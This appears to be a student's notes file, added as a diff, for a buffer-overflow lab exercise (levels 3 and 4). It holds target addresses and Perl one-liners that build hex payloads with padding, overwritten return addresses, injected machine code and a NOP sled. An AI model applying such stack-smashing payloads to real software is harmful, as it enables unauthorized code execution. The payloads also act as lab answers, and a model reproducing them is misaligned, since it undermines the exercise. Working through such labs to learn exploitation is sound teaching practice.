@@ -1,0 +1,25 @@
+08048e49 
+
+e8 39 68 55
+
+55683a10
+
+
+
+perl -e 'print "61 "x32, "BB "x4, "CC "x4, "DD "x4, "e8 39 68 55 ", "b8 34 48 2b 4a 68 49 8e 04 08 c3"' > hexlevel3
+
+perl -e 'print "61 "x32, "BB "x4, "CC "x4, "DD "x4, "e8 39 68 55 ", "b8 34 48 2b 4a bd 10 3a 68 55 68 49 8e 04 08 c3" ' > hexlevel3_2
+
+
+LEVEL 4
+
+0x08048dd4 < address to add to push
+
+ 55683a10  
+556839e0 
+
+0x08048dcd
+
+0x55683818
+
+perl -e 'print "90 "x509, "8d 6c 24 28 b8 34 48 2b 4a 68 cd 8d 04 08 c3 ", "f8 37 68 55 "'> hexlevel4_2
